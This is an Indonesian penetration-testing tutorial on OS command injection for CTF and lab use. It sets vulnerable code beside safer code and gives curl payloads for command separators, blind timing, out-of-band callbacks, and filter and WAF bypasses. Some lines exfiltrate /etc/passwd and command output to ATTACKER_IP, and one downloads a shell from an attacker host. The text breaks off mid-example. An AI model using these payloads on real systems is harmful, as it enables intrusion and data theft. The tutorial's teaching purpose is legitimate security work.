---
id: "26"
title: "🖥️ 26 — Command Injection Workflow"
category: "3. Web Exploitation"
categoryId: "web"
filename: "26_command_injection_workflow.md"
refs_out: ["01","05","06","07","14a","14c","25","44","45","47","64"]
refs_in: ["04","15","17","27"]
---

← [File 25: File Upload](/docs/file-upload)

# 🖥️ 26 — Command Injection Workflow

> **Category:** Web Exploitation  
> **Difficulty:** Fundamental → Intermediate → Advanced  
> **Type:** OS Command Injection / RCE  
> **Prerequisites:**
> 
> - [File 01–25](/docs/mindset-dan-metodologi) — terutama [File 25: File Upload](/docs/file-upload)
>     
> - Basic HTTP
>     
> - Basic Linux
>     
> - Basic Windows
>     
> - `curl`
>     
> - Burp Suite
>     
> 
> **Primary Labs:** HackTheBox, TryHackMe, PortSwigger  
> **Environment:** Parrot OS XFCE / Debian-based
> 
> **Scope:** Semua teknik eksploitasi dan persistence pada dokumen ini ditujukan untuk **CTF, lab, dan sistem yang secara eksplisit diizinkan untuk diuji**.

---

# 📚 Daftar Isi

- [0 — Fundamentals](#0--fundamentals)
    
    - [0.1 Apa Itu Command Injection](#01-apa-itu-command-injection)
        
    - [0.2 Attack Surface](#02-attack-surface)
        
    - [0.3 Reconnaissance Command Injection](#03-reconnaissance-command-injection)
        
- [1 — Basic Injection Techniques](#1--basic-injection-techniques)
    
    - [1.1 Command Separators](#11-command-separators)
        
    - [1.2 Cara Test Pertama Kali](#12-cara-test-pertama-kali)
        
    - [1.3 In-Band vs Out-of-Band](#13-in-band-vs-out-of-band)
        
- [2 — Blind Command Injection](#2--blind-command-injection)
    
    - [2.1 Time-Based Detection](#21-time-based-detection)
        
    - [2.2 Out-of-Band Detection](#22-out-of-band-detection)
        
    - [2.3 OOB Data Exfiltration](#23-oob-data-exfiltration)
        
- [3 — Filter Bypass](#3--filter-bypass)
    
    - [3.1 Space Bypass](#31-space-bypass)
        
    - [3.2 Special Character Bypass](#32-special-character-bypass)
        
    - [3.3 Blacklist Bypass](#33-blacklist-bypass)
        
    - [3.4 Length Restriction Bypass](#34-length-restriction-bypass)
        
    - [3.5 WAF Bypass](#35-waf-bypass)
        
    - [3.6 Argument Injection — Variant Penting](#36-argument-injection--variant-penting)
        
- [4 — Post-Exploitation via Command Injection](#4--post-exploitation-via-command-injection)
    
    - [4.1 Information Gathering](#41-information-gathering)
        
    - [4.2 Reverse Shell via Command Injection](#43-reverse-shell-via-command-injection)
        
    - [4.3 Shell Stabilization — Setelah Dapat Reverse Shell](#431-shell-stabilization--setelah-dapat-reverse-shell)
        
    - [4.4 Upgrade ke Persistent Access](#44-upgrade-ke-persistent-access)
        
- [5 — Environment Specific](#5--environment-specific)
    
    - [5.1 Linux Command Injection](#51-linux-command-injection)
        
    - [5.2 Windows Command Injection](#52-windows-command-injection)
        
    - [5.3 Blind Injection di Windows](#53-blind-injection-di-windows)
        
- [6 — Tools & Automation](#6--tools--automation)
    
    - [6.1 Manual Testing dengan curl](#61-manual-testing-dengan-curl)
        
    - [6.2 Commix](#62-commix)
        
    - [6.3 Script cmdinjection_test.sh](#63-script-cmdinjection_testsh)
        
- [7 — Decision Tree Lengkap](#7--decision-tree-lengkap)
    
- [8 — Common Errors & Troubleshooting](#8--common-errors--troubleshooting)
    
- [9 — Golden Rules](#9--golden-rules)
    
- [10 — Final Checklist & Quick Reference](#10--final-checklist--quick-reference)
    

---

# 🧠 0 — Fundamentals

# 0.1 Apa Itu Command Injection

Command Injection terjadi ketika aplikasi mengambil input yang dikontrol user lalu memasukkannya ke dalam perintah sistem operasi tanpa melakukan pemisahan data dan command secara aman.

Model sederhananya:

```text
USER INPUT
    │
    ▼
┌────────────────┐
│ Web Application│
└───────┬────────┘
        │
        │ string concatenation
        ▼
┌────────────────┐
│ Shell / Command│
│ Interpreter     │
└───────┬────────┘
        │
        ▼
┌────────────────┐
│ Operating      │
│ System          │
└────────────────┘
```

Contoh:

```text
User input:

8.8.8.8

Application membuat:

ping -c 4 8.8.8.8
```

Jika input dapat mengubah struktur command:

```text
8.8.8.8; id
```

maka command dapat menjadi:

```text
ping -c 4 8.8.8.8; id
```

Shell memproses:

```text
1. ping
2. id
```

---

## OS Command Injection vs Code Injection

### OS Command Injection

Target:

```text
Operating System
```

Contoh:

```text
ping
nslookup
cat
id
whoami
```

### Code Injection

Target:

```text
Language runtime
```

Contoh:

```text
PHP
Python
JavaScript
Ruby
```

Contoh model:

```text
OS Command Injection
        ↓
Shell
        ↓
OS command

Code Injection
        ↓
Interpreter
        ↓
Application language code
```

---

## Kondisi yang Membuat Command Injection Terjadi

Biasanya terdapat pola seperti:

```text
User input
   ↓
String concatenation
   ↓
system()
exec()
shell_exec()
passthru()
popen()
subprocess(..., shell=True)
os.system()
child_process.exec()
```

Contoh mental model insecure:

```text
COMMAND = "ping " + USER_INPUT
```

Lebih aman:

```text
COMMAND = executable + validated_argument[]
```

atau gunakan API yang tidak melibatkan shell.

---

## Kenapa Berbahaya?

Command Injection dapat menghasilkan:

```text
Arbitrary command execution
        ↓
Code execution
        ↓
Application compromise
        ↓
Credential access
        ↓
Lateral movement
        ↓
Full host compromise
```

Impact bergantung pada privilege process:

```text
www-data
    ↓
limited impact

root
    ↓
full system control
```

---

## PHP — Vulnerable vs Safer

### Vulnerable

```php
<?php
$host = $_GET['host'];

$output = shell_exec("ping -c 4 " . $host);

echo "<pre>";
echo htmlspecialchars($output);
echo "</pre>";
?>
```

Masalah:

```text
shell_exec()
+
string concatenation
+
user-controlled input
```

---

### Safer

```php
<?php
$host = $_GET['host'];

if (!filter_var($host, FILTER_VALIDATE_IP)) {
    http_response_code(400);
    exit("Invalid IP address");
}

$cmd = [
    "ping",
    "-c",
    "4",
    $host
];

$descriptors = [
    1 => ["pipe", "w"],
    2 => ["pipe", "w"]
];

$process = proc_open(
    $cmd,
    $descriptors,
    $pipes
);

if (!is_resource($process)) {
    exit("Unable to start process");
}

$output = stream_get_contents($pipes[1]);
$errors = stream_get_contents($pipes[2]);

fclose($pipes[1]);
fclose($pipes[2]);

proc_close($process);

echo "<pre>";
echo htmlspecialchars($output);
echo "</pre>";
?>
```

Kuncinya bukan sekadar escaping.

Yang lebih penting:

```text
validate input
+
avoid shell
+
use argument array
```

---

# Python — Vulnerable vs Safer

## Vulnerable

```python
import os

host = input("Host: ")
os.system("ping -c 4 " + host)
```

---

## Safer

```python
import ipaddress
import subprocess

host = input("Host: ").strip()

try:
    ipaddress.ip_address(host)
except ValueError:
    raise SystemExit("Invalid IP")

subprocess.run(
    ["ping", "-c", "4", host],
    check=False
)
```

Catatan penting:

```text
subprocess.run([...])
```

tanpa:

```text
shell=True
```

jauh lebih aman untuk kasus sederhana.

---

# Node.js — Vulnerable vs Safer

## Vulnerable

```javascript
const { exec } = require("child_process");

const host = req.query.host;

exec(`ping -c 4 ${host}`, (error, stdout, stderr) => {
    res.send(stdout);
});
```

---

## Safer

```javascript
const { spawn } = require("child_process");

const host = req.query.host;

if (!/^[0-9.]+$/.test(host)) {
    return res.status(400).send("Invalid host");
}

const child = spawn("ping", ["-c", "4", host]);

let output = "";

child.stdout.on("data", chunk => {
    output += chunk;
});

child.on("close", () => {
    res.send(output);
});
```

---

# 0.2 Attack Surface

Command Injection sering tersembunyi di feature yang "terlihat normal".

|Feature|Possible Backend Command|Attack Vector|
|---|---|---|
|Ping tool|`ping`|`host` parameter|
|NSLookup|`nslookup`|`domain` parameter|
|Whois|`whois`|`domain` parameter|
|Traceroute|`traceroute`|`host` parameter|
|Image conversion|`convert`|filename/options|
|PDF generation|`wkhtmltopdf`, LibreOffice|URL / filename / options|
|Send email|`mail`, `sendmail`|recipient / subject / attachment|
|File operations|`cp`, `mv`, `rm`|filename/path|
|Backup|`tar`, `zip`|archive path / filename|
|Network diagnostics|`curl`, `wget`, `nc`|URL/host|
|Admin panel|system utilities|various input fields|
|Monitoring|ping / traceroute|monitored host|
|Import/Export|archive utilities|filename/path|
|Media processing|ImageMagick/FFmpeg|filename/metadata/options|

### 📌 Kapan Digunakan

Gunakan attack-surface thinking ketika fitur melakukan sesuatu yang secara alami dapat diimplementasikan menggunakan binary OS.

Trigger mental:

```text
"Feature ini kemungkinan menjalankan binary apa?"
```

---

# 0.3 Reconnaissance Command Injection

Jangan mulai dengan:

```text
; whoami
```

secara membabi buta.

Mulai dengan memahami behavior.

---

## Indikator 1 — Response yang Sangat Berubah

Contoh:

```text
Normal:

Host reachable
```

Setelah input malformed:

```text
ping: unknown host
```

Ini menunjukkan kemungkinan ada system command di belakang input.

---

## Indikator 2 — Error Message

Clue:

```text
sh: syntax error
bash: command not found
/bin/sh:
nslookup:
ping:
```

Contoh:

```text
sh: syntax error near unexpected token `;'
```

Ini merupakan indikator kuat bahwa shell memproses input.

---

## Indikator 3 — Response Time

Normal:

```text
0.21 s
```

Dengan payload timing:

```text
5.22 s
```

Perubahan konsisten dapat menjadi bukti blind command execution.

---

## Indikator 4 — Behavioral Difference

Misalnya:

```text
host=127.0.0.1
    → normal

host=invalid
    → error berbeda

host=<payload>
    → response behavior berubah
```

---

### 📌 Kapan Digunakan

Digunakan pada:

```text
parameter yang terlihat "dilempar" ke network/file/system utility
```

---

# 🔥 1 — Basic Injection Techniques

# 1.1 Command Separators

> **Catatan:** behavior bergantung pada shell yang digunakan dan bagaimana aplikasi membangun command.

---

## `;` — Semicolon

### Cara Kerja

Memisahkan dua command secara berurutan.

```text
command1 ; command2
```

### 📌 Kapan Digunakan

Prioritaskan pada Linux/Unix shell seperti:

```text
sh
bash
dash
```

### Payload

```bash
# Bash shell syntax used as an input payload:
127.0.0.1; id
```

### curl

```bash
# Encode the payload safely as a query parameter:
curl -G 'http://TARGET/ping' \
  --data-urlencode 'host=127.0.0.1; id'
```

Expected:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## `&` — Background / Command Separator

Shell dapat menjalankan command sebelum `&` lalu command berikutnya.

```text
command1 & command2
```

### 📌 Kapan Digunakan

Gunakan pada shell yang mengenali `&`.

### Payload

```bash
# Run the second command after backgrounding the first:
127.0.0.1 & id
```

### curl

```bash
# Use --data-urlencode so '&' is not interpreted by the local shell:
curl -G 'http://TARGET/ping' \
  --data-urlencode 'host=127.0.0.1 & id'
```

Expected:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## `&&` — Logical AND

Command kedua dijalankan jika command pertama berhasil.

```text
command1 && command2
```

### 📌 Kapan Digunakan

Bagus ketika ingin memastikan command awal exit code `0`.

### Payload

```bash
# Execute id only when ping succeeds:
127.0.0.1 && id
```

### curl

```bash
# URL-encode the logical AND payload:
curl -G 'http://TARGET/ping' \
  --data-urlencode 'host=127.0.0.1 && id'
```

---

## `|` — Pipe

Output command pertama diberikan sebagai stdin command kedua.

```text
command1 | command2
```

### 📌 Kapan Digunakan

Gunakan ketika separator lain diblok tetapi pipe masih diterima.

### Payload

```bash
# Pipe output of echo into another command:
echo test | id
```

Catatan:

`id` tidak menggunakan stdin secara berarti, jadi untuk demonstrasi behavior gunakan command yang memang membaca stdin.

### curl

```bash
# Demonstrate pipe handling in the vulnerable parameter:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=echo test | wc -c'
```

Expected:

```text
5
```

---

## `||` — Logical OR

Command kedua dijalankan jika command pertama gagal.

```text
command1 || command2
```

### 📌 Kapan Digunakan

Useful untuk mendeteksi apakah command pertama gagal.

### Payload

```bash
# Force first command to fail, then execute id:
false || id
```

### curl

```bash
# Send the OR separator as the parameter value:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=false || id'
```

Expected:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## `\n` — Newline

Newline dapat menjadi command terminator pada shell tertentu.

```text
command1
command2
```

### 📌 Kapan Digunakan

Gunakan ketika input dapat mempertahankan literal newline.

### curl

```bash
# $'...' creates a literal newline locally before curl URL-encodes it:
curl -G 'http://TARGET/test' \
  --data-urlencode $'input=127.0.0.1\nid'
```

Expected:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Backtick — `` ` ``

Backtick menjalankan command substitution.

```text
echo `id`
```

Shell terlebih dahulu menjalankan:

```text
id
```

kemudian hasilnya dimasukkan ke command.

### 📌 Kapan Digunakan

Useful pada shell yang mendukung legacy command substitution.

### Payload

```bash
# Command substitution using backticks:
echo `id`
```

### curl

```bash
# URL-encode the backtick payload:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=echo `id`'
```

---

## `$()` — Modern Command Substitution

Bentuk modern:

```text
$(id)
```

Contoh:

```bash
# Command substitution with the modern syntax:
echo $(id)
```

### curl

```bash
# Send a modern command-substitution payload:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=echo $(id)'
```

---

# 1.2 Cara Test Pertama Kali

Urutan optimal:

```text
                COMMAND INJECTION
                       │
                       ▼
              Separator testing
                       │
                       ▼
               Output testing
                       │
                 ┌─────┴─────┐
                 │           │
               output      no output
                 │           │
                 ▼           ▼
               in-band     blind
                             │
                             ▼
                           timing
                             │
                             ▼
                            OOB
```

---

## Canary Terbaik

Untuk pemula:

```text
id
```

atau:

```text
whoami
```

Kenapa?

Karena output mudah dikenali.

Contoh:

```text
uid=33(www-data)
```

lebih kuat daripada:

```text
hello
```

---

## Quick One-Liner Test (Semua Separator)

```bash
# Quick loop untuk test semua separator sekaligus:
for sep in ';' '&' '&&' '|' '||' '%0a'; do
    echo -n "Testing separator [$sep]: "
    curl -sG -o /dev/null -w "%{http_code} %{time_total}s\n" \
        'http://TARGET/ping' \
        --data-urlencode "host=127.0.0.1${sep}id"
done
```

---

## Test `id`

```bash
# Test command execution with a simple identity command:
curl -G 'http://TARGET/ping' \
  --data-urlencode 'host=127.0.0.1; id'
```

---

## Test `whoami`

```bash
# Test the account under which the web process runs:
curl -G 'http://TARGET/ping' \
  --data-urlencode 'host=127.0.0.1; whoami'
```

---

## Test Blind — `sleep 5`

```bash
# Delay execution by five seconds:
curl -G -o /dev/null -s \
  -w 'TOTAL_TIME=%{time_total}\n' \
  'http://TARGET/ping' \
  --data-urlencode 'host=127.0.0.1; sleep 5'
```

Expected:

```text
TOTAL_TIME=5.13
```

---

## Urutan Testing

```text
1. benign input
2. separator
3. id
4. whoami
5. sleep 5
6. OOB callback
7. exfiltration
```

### 📌 Kapan Digunakan

Gunakan urutan ini setiap kali menemukan parameter mencurigakan.

---

# 1.3 In-Band vs Blind vs OOB

## In-Band

Output terlihat langsung.

```text
Request
  ↓
Command execution
  ↓
stdout
  ↓
HTTP response
```

Contoh:

```text
uid=33(www-data)
```

---

## Blind

Command berhasil tetapi output tidak dikembalikan.

```text
Request
  ↓
Command execution
  ↓
stdout discarded
  ↓
HTTP response unchanged
```

Gunakan timing.

---

## OOB

Server membuat koneksi keluar ke attacker-controlled infrastructure.

```text
Browser
   │
   ▼
Target
   │
   │ DNS / HTTP callback
   ▼
Attacker infrastructure
```

### 📌 Kapan Digunakan

```text
In-band → output terlihat
Blind → output tidak terlihat
OOB → timing tidak nyaman / perlu konfirmasi kuat
```

---

# 🔬 2 — Blind Command Injection

# 2.1 Time-Based Detection

Pada blind injection kita tidak melihat:

```text
uid=...
```

jadi kita mengukur efek samping yang terlihat:

```text
execution delay
```

---

## `sleep 5`

Normal:

```text
0.20 s
```

Payload:

```text
sleep 5
```

Response:

```text
5.20 s
```

Ini merupakan indikasi kuat.

---

## curl Timing

```bash
# Establish a baseline without injection:
curl -o /dev/null -s \
  -w 'NORMAL=%{time_total}\n' \
  'http://TARGET/ping?host=127.0.0.1'
```

Kemudian:

```bash
# Measure a five-second delay:
curl -o /dev/null -s \
  -w 'INJECTED=%{time_total}\n' \
  -G 'http://TARGET/ping' \
  --data-urlencode 'host=127.0.0.1; sleep 5'
```

Contoh:

```text
NORMAL=0.184
INJECTED=5.231
```

---

## `ping -c 5`

Jika `sleep` diblok:

```bash
# Cause a roughly five-second network wait on Linux:
curl -o /dev/null -s \
  -w 'TIME=%{time_total}\n' \
  -G 'http://TARGET/ping' \
  --data-urlencode 'host=127.0.0.1; ping -c 5 127.0.0.1'
```

---

## Berapa Detik yang Reliable?

Jangan menggunakan angka absolut seperti:

```text
"lebih dari 3 detik pasti injection"
```

Itu terlalu simplistik.

Gunakan pembandingan:

```text
Baseline median
+
payload delay
+
beberapa percobaan
```

Contoh:

```text
Baseline:
0.18
0.21
0.17
0.20
0.19

Median ≈ 0.19 s
```

Dengan payload:

```text
5.19
5.24
5.15
5.27
5.18
```

Perbedaan ~5 detik sangat kuat.

Praktik CTF:

```text
Δ ≥ 4–5 detik secara konsisten
```

sangat meyakinkan.

Tetapi jangan menjadikan angka tersebut sebagai bukti tunggal.

---

## Test Berulang

```bash
# Run three timing samples for comparison:
for i in 1 2 3; do
    curl -o /dev/null -s \
      -w "RUN=$i TIME=%{time_total}\n" \
      -G 'http://TARGET/ping' \
      --data-urlencode 'host=127.0.0.1; sleep 5'
done
```

Contoh output:

```text
RUN=1 TIME=5.18
RUN=2 TIME=5.24
RUN=3 TIME=5.16
```

### 📌 Kapan Digunakan

Gunakan timing ketika:

```text
output tidak muncul
```

dan:

```text
response tetap dapat diukur
```

---

# 2.2 Out-of-Band Detection

OOB sangat berguna untuk blind command injection.

Flow:

```text
HTTP Request
     │
     ▼
Target executes command
     │
     ▼
Target DNS/HTTP callback
     │
     ▼
OOB listener
     │
     ▼
Callback observed
```

---

## Burp Collaborator

Workflow:

```text
1. Generate Collaborator payload
2. Put domain into command
3. Trigger endpoint
4. Poll Collaborator
5. Observe DNS/HTTP interaction
```

Payload konsep:

```bash
# Replace OOB_DOMAIN with your Collaborator-generated hostname:
curl -G 'http://TARGET/ping' \
  --data-urlencode 'host=127.0.0.1; nslookup OOB_DOMAIN'
```

Contoh:

```text
abc123.oastify.com
```

---

## interactsh

Install:

```bash
# Install interactsh using the Go toolchain if available:
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
```

Run:

```bash
# Start an OOB interaction client:
interactsh-client
```

Contoh:

```text
[INF] Listing 1 payload for OOB Testing
[INF] xxx.interactsh.com
```

Trigger:

```bash
# Ask the target to perform DNS resolution:
curl -G 'http://TARGET/ping' \
  --data-urlencode 'host=127.0.0.1; nslookup xxx.interactsh.com'
```

Expected interactsh:

```text
DNS xxx.interactsh.com
Interaction received from 10.10.10.50
```

---

## `dig`

```bash
# Resolve the OOB hostname from the target:
curl -G 'http://TARGET/test' \
  --data-urlencode 'host=127.0.0.1; dig OOB_DOMAIN'
```

---

## `nslookup`

```bash
# Trigger a DNS callback:
curl -G 'http://TARGET/test' \
  --data-urlencode 'host=127.0.0.1; nslookup OOB_DOMAIN'
```

---

## HTTP OOB

```bash
# Ask the target to issue an outbound HTTP request:
curl -G 'http://TARGET/test' \
  --data-urlencode 'host=127.0.0.1; curl http://OOB_DOMAIN'
```

Jika target memiliki `wget`:

```bash
# Trigger an outbound HTTP request using wget:
curl -G 'http://TARGET/test' \
  --data-urlencode 'host=127.0.0.1; wget -qO- http://OOB_DOMAIN'
```

---

## Python HTTP Listener

Attacker machine:

```bash
# Start a simple HTTP server on the local interface:
python3 -m http.server 8000 --bind 0.0.0.0
```

Jika target dapat menjangkau host tersebut:

```bash
# Trigger a callback to the attacker host:
curl -G 'http://TARGET/test' \
  --data-urlencode 'host=127.0.0.1; curl http://ATTACKER_IP:8000/'
```

Expected:

```text
10.10.10.50 - - [07/Sep/2026 13:20:10]
"GET / HTTP/1.1" 200 -
```

---

## ngrok + netcat

Untuk lab yang memang memerlukan public tunnel:

```bash
# Expose a local TCP listener through ngrok:
ngrok tcp 4444
```

Kemudian:

```bash
# Start a TCP listener on the local machine:
nc -lvnp 4444
```

Gunakan address/port yang diberikan ngrok untuk koneksi target.

> Untuk DNS OOB, `interactsh` atau Collaborator biasanya lebih sederhana daripada membangun tunnel sendiri.

### 📌 Kapan Digunakan

Prioritaskan OOB ketika:

```text
blind
+
timing ambiguous
+
outbound network available
```

---

# 2.3 OOB Data Exfiltration

> **CTF/lab only.** Jangan mengirim data sensitif dari sistem yang tidak Anda miliki atau tidak punya izin untuk diuji.

---

## Kirim Hasil `id` via HTTP

Attacker:

```bash
# Start a callback server:
python3 -m http.server 8000 --bind 0.0.0.0
```

Target payload:

```bash
# Execute id and send its output as a URL query parameter:
curl -G 'http://TARGET/test' \
  --data-urlencode 'host=127.0.0.1; curl "http://ATTACKER_IP:8000/?d=$(id | base64 -w0)"'
```

Attacker menerima:

```text
GET /?d=dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzM...
```

Decode:

```bash
# Decode the Base64 value from the callback:
echo 'BASE64_DATA' | base64 -d
```

---

## Kirim `/etc/passwd`

Dalam lab:

```bash
# Encode /etc/passwd before sending it through HTTP:
curl -G 'http://TARGET/test' \
  --data-urlencode 'host=127.0.0.1; curl "http://ATTACKER_IP:8000/?d=$(base64 -w0 /etc/passwd)"'
```

Atau menggunakan `cat`:

```bash
# Send the file contents as an encoded callback:
curl -G 'http://TARGET/test' \
  --data-urlencode 'host=127.0.0.1; curl "http://ATTACKER_IP:8000/?d=$(cat /etc/passwd | base64 -w0)"'
```

---

## DNS Exfiltration

DNS memiliki keterbatasan karakter dan panjang.

Konsep:

```text
command output
      ↓
base64
      ↓
DNS label
      ↓
OOB server
```

Contoh lab:

```bash
# Exfiltrate a small output fragment using DNS:
curl -G 'http://TARGET/test' \
  --data-urlencode 'host=127.0.0.1; nslookup $(id | base64 -w0).OOB_DOMAIN'
```

Gunakan data kecil terlebih dahulu.

### 📌 Kapan Digunakan

OOB exfiltration berguna ketika:

```text
output tidak terlihat
+
target boleh outbound
+
Anda perlu membuktikan command execution
```

---

# 🛡️ 3 — Filter Bypass

# 3.1 Space Bypass

---

## `${IFS}`

`IFS` adalah Internal Field Separator pada shell.

Konsep:

```text
cat /etc/passwd

↓ bypass literal spaces

cat${IFS}/etc/passwd
```

### 📌 Kapan Digunakan

Gunakan ketika:

```text
space character
```

diblok tetapi shell expansion masih tersedia.

### curl

```bash
# Replace literal spaces with ${IFS}:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=cat${IFS}/etc/passwd'
```

---

## `$IFS$9`

Varian klasik:

```text
cat$IFS$9/etc/passwd
```

### curl

```bash
# Use the $IFS$9 spacing technique:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=cat$IFS$9/etc/passwd'
```

---

## `{cmd,arg}`

Brace expansion sendiri bukan pengganti spasi untuk semua command.

Contoh yang lebih tepat adalah menggunakan shell syntax untuk membentuk token.

```bash
# Brace expansion example for shell-aware input transformation:
bash -c 'printf "%s\n" {cmd,arg}'
```

**Jangan menganggap `{cmd,arg}` universal sebagai space bypass.**

---

## Tab

Shell dapat menggunakan tab sebagai whitespace.

```bash
# Use a tab character between command and argument:
curl -G 'http://TARGET/test' \
  --data-urlencode $'input=cat\t/etc/passwd'
```

---

## Redirect `<`

Shell redirection dapat menghindari beberapa kebutuhan whitespace/argument pattern.

Contoh:

```bash
# Read a file through shell input redirection:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=wc -c</etc/passwd'
```

### 📌 Kapan Digunakan

Gunakan bila:

```text
space blocked
```

tetapi:

```text
redirection
```

masih tersedia.

---

# 3.2 Special Character Bypass

## Quote Bypass

Empty single quotes dapat disisipkan di antara token shell.

```text
c'a't
```

shell dapat memperlakukannya sebagai:

```text
cat
```

### curl

```bash
# Split a blacklisted keyword using empty quotes:
curl -G 'http://TARGET/test' \
  --data-urlencode "input=c''at /etc/passwd"
```

---

## Double Quotes

```bash
# Split the command name with empty double quotes:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=c""at /etc/passwd'
```

---

## Variable Injection

Shell variable expansion dapat menghasilkan string command.

```bash
# Concatenate shell variables to form a token:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=$'\''c'\''at /etc/passwd'
```

> Syntax quoting pada command line lokal perlu diperhatikan. Burp Repeater sering lebih nyaman untuk payload kompleks.

---

## Concatenation

```bash
# Construct "cat" using quoted fragments:
curl -G 'http://TARGET/test' \
  --data-urlencode "input=c'a't /etc/passwd"
```

---

## Wildcard

Contoh konsep:

```text
/???/??sp???
```

bergantung pada filesystem dan pattern yang cocok.

Contoh:

```bash
# Demonstrate wildcard expansion for /etc/passwd-like paths:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=cat /???/p????d'
```

Wildcard tidak selalu identik dengan `/etc/passwd`; gunakan hanya jika pattern memang cocok.

### 📌 Kapan Digunakan

Gunakan ketika keyword blacklist terlihat seperti:

```text
cat
```

dan wildcard/concatenation masih diproses shell.

---

# 3.3 Blacklist Bypass

Blacklist biasanya berbentuk:

```text
if "cat" in input:
    reject
```

Masalahnya:

```text
shell syntax memiliki banyak cara merepresentasikan hal serupa
```

---

## Case Manipulation

Pada Linux command name umumnya case-sensitive:

```text
CAT
Cat
cAt
```

biasanya **bukan** `cat`.

Jadi:

> Jangan mengasumsikan case manipulation akan bekerja pada Linux.

### Kapan Case Manipulation Berguna?

Case manipulation **hanya berguna** ketika:
- **Filter di application layer** adalah case-insensitive
- **Tapi shell** tetap case-sensitive

**Contoh Scenario:**

```python
# Filter di Python (case-insensitive)
if "cat" in user_input.lower():
    return "Blocked"

# User input: CAT /etc/passwd
# Filter tidak blok karena "CAT".lower() = "cat" tidak ada dalam "CAT"
# Tapi shell execute: CAT /etc/passwd (akan error di Linux)
```

**Kapan ini benar-benar work:**

```bash
# Jika filter cek literal "cat" tapi tidak cek "CAT"
Filter: if "cat" in input: block

# Bypass (di Windows CMD atau case-insensitive shell):
CAT /etc/passwd  # Filter tidak blok, tapi shell juga tidak execute di Linux

# Praktis: Case manipulation jarang berguna di command injection Linux
# Lebih berguna di:
# - Windows CMD (case-insensitive)
# - SQL injection (SQL keywords case-insensitive)
```

> **Bottom line:** Teknik ini sangat **spesifik ke implementasi filter**, bukan karena shell atau OS behavior. Jarang berguna di praktik CTF Linux.

---

## Encoding Hex

Shell dapat melakukan command substitution dengan utility tertentu.

Contoh demonstrasi:

```bash
# Demonstrate generating "id" through printf hexadecimal escaping:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=$(printf "\151\144")'
```

Output yang diharapkan:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Environment Variable Abuse

Contoh:

```bash
# Display the PATH variable:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=echo $PATH'
```

PATH dapat memberi clue executable search path.

---

## Command dari Variable

```bash
# Assign a short command to a variable and execute it:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=CMD=id; $CMD'
```

Ini hanya bekerja jika semicolon dan variable expansion tersedia.

---

### 📌 Kapan Digunakan

Gunakan blacklist bypass **hanya setelah membuktikan filter**, misalnya:

```text
cat     → blocked
id      → accepted
```

Jangan bypass filter yang belum diketahui keberadaannya.

---

# 3.4 Length Restriction Bypass

Misalnya parameter hanya menerima:

```text
10 characters
```

Fokus pada primitive kecil:

```text
id
ls
pwd
```

---

## Chaining Command Pendek

```bash
# Use a compact payload for a length-constrained parameter:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=id'
```

Kemudian cari stateful behavior atau output sink yang memungkinkan langkah berikutnya.

---

## Redirect ke File

Pada lab tertentu:

```bash
# Write a short marker into a writable temporary location:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=echo TEST>/tmp/x'
```

Kemudian:

```bash
# Read the marker back if a later command sink is available:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=cat</tmp/x'
```

---

### 📌 Kapan Digunakan

Gunakan ketika:

```text
server-side max length
```

membatasi satu payload panjang.

---

# 3.5 WAF Bypass

WAF biasanya mencari pattern seperti:

```text
;
&&
||
/bin/sh
/etc/passwd
curl
wget
bash
```

Tetapi WAF bukan bukti backend aman.

---

## Encoding

Gunakan URL encoding:

```bash
# Let curl perform query parameter URL encoding:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=127.0.0.1; id'
```

---

## Chunking / Token Splitting

Contoh:

```bash
# Split the command token using shell concatenation:
curl -G 'http://TARGET/test' \
  --data-urlencode 'input=w'\'h\'\'o\'\'a\'\'m\'\'i'
```

---

# 3.6 Argument Injection — Variant Penting

### 📌 Kapan Digunakan

**Argument Injection** berbeda dari **Command Injection**. Gunakan teknik ini ketika:
- User input dimasukkan sebagai **argument** ke command
- Tidak bisa inject command baru (separator blocked)
- Tapi bisa inject **flags/options** ke command yang ada

### Perbedaan: Command Injection vs Argument Injection

**Command Injection:**
```bash
# User input mengubah command structure
ping 127.0.0.1; id
# ↑ Menambah command baru dengan ;
```

**Argument Injection:**
```bash
# User input mengubah flag/argument command
curl $USER_INPUT
# Input: --output /tmp/shell http://attacker/shell.php
# Result: curl --output /tmp/shell http://attacker/shell.php
```

---

## Vulnerable Patterns

### Pattern 1: curl/wget dengan User-Controlled URL

```php
// Vulnerable PHP code
$url = $_GET['url'];
system("curl $url");
```

**Exploit:**

```bash
# Normal use:
curl -G 'http://TARGET/fetch' \
  --data-urlencode 'url=http://example.com'

# Argument injection:
curl -G 'http://TARGET/fetch' \
  --data-urlencode 'url=--output /tmp/shell http://attacker/shell.php'

# Resulting command:
# curl --output /tmp/shell http://attacker/shell.php
```

### Pattern 2: ImageMagick convert

```php
// Vulnerable code
$file = $_GET['file'];
system("convert $file output.png");
```

**Exploit:**

```bash
# Inject read arbitrary file:
curl -G 'http://TARGET/convert' \
  --data-urlencode 'file=input.jpg -write /etc/passwd output.txt'

# Resulting command:
# convert input.jpg -write /etc/passwd output.txt output.png
```

### Pattern 3: git clone

```php
// Vulnerable code
$repo = $_GET['repo'];
system("git clone $repo /tmp/repo");
```

**Exploit:**

```bash
# Inject upload hook:
curl -G 'http://TARGET/clone' \
